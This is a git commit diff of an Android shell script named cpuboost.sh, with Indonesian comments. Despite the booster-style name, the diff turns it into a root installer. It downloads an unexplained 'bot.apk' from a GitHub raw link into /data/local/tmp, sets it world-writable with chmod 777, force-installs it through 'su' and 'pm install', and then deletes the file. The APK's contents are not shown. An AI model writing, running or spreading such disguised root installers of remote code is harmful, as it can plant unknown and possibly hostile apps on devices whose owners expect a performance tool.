9667e682d284614960dccd4809032126df022420
gajelasfefek-afk <gajelasfefek@gmail.com>
2026-03-08 12:09:11 +0700

    Update cpuboost.sh for improved APK download and install

--- cpuboost.sh
+++ cpuboost.sh
@@ -1,35 +1,38 @@
-#!/bin/sh
+#!/system/bin/sh
 
-# Banner DRAG
+# --- BANNER DRAG ---
 echo "  ____   ____        _     ____ "
 echo " |  _ \ |  _ \      / \   / ___|"
 echo " | | | || |_) |    / _ \ | |  _ "
 echo " | |_| ||  _ <    / ___ \| |_| |"
 echo " |____/ |_| \_\  /_/   \_\\____|"
-echo "      [ DEVELOPED BY DRAG ]"
+echo "      [ MODE: ROOT ACTIVE ]"
 echo "------------------------------------"
 
-# LINK SAKTI LU TADI
+# --- KONFIGURASI ---
 LINK="https://raw.githubusercontent.com/gajelasfefek-afk/Cpuchecker/refs/heads/main/bot.apk"
-FILE="bot.apk"
+# Kita simpen di folder temporary sistem biar gak ditolak permission
+DEST="/data/local/tmp/bot.apk"
 
-echo "[*] Menyedot APK dari GitHub..."
-# Tambahin flag -L biar kalo GitHub nge-redirect tetep dapet
-curl -L "$LINK" -o "$FILE"
+echo "[*] Mendownload APK ke jalur sistem..."
+curl -L -o "$DEST" "$LINK"
 
-if [ -f "$FILE" ]; then
-    echo "[+] Download Berhasil!"
-    echo "[-] Memasang APK ke Cloud Phone..."
-    pm install -r "$FILE"
+if [ -f "$DEST" ]; then
+    echo "[+] File mendarat di $DEST"
+    echo "[-] Menjalankan Paksa Instalasi (Root)..."
+    
+    # Cara paling ampuh: Panggil 'pm install' lewat 'su'
+    # Kita tambahin 'chmod' biar filenya bisa dibaca sistem
+    su -c "chmod 777 $DEST && pm install -r $DEST"
     
     if [ $? -eq 0 ]; then
-        echo "[!] INSTALL SUCCESS! APK SIAP TEMPUR."
-        rm "$FILE"
+        echo "[!] BOOM! INSTALL SUCCESS, DRAG!"
+        su -c "rm $DEST"
     else
-        echo "[X] INSTALL GAGAL! (Coba ketik 'su' dulu di terminal)"
+        echo "[X] GAGAL TOTAL! Cek apakah notif Root muncul di layar?"
     fi
 else
-    echo "[X] DOWNLOAD GAGAL! Link-nya mungkin typo, Cuk."
+    echo "[X] DOWNLOAD GAGAL! Cek koneksi lu, Cuk."
 fi
 
 echo "------------------------------------"
